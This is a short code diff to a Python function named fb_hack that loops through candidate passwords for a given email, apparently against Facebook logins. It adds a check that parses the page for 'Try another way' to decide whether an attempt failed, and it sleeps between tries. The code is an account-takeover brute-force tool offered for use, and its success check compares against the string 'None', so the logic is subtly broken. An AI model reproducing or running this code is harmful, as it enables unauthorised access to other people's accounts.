@@ -65,13 +65,19 @@ def fb_hack(email, codex):
       print(counter, end="")
       print(": ", end="")
       print(p, end="")
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      taw = soup.find(string="Try another way")
+      if taw != "None":
+        print(" failed")
+      else:
+        print(" check")
+        break
     except:
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       with open("output1.html", "w") as file:
         file.write(str(soup))
-    print(counter)  
-    print(p)
     counter += 1
     sleepy(30)
     
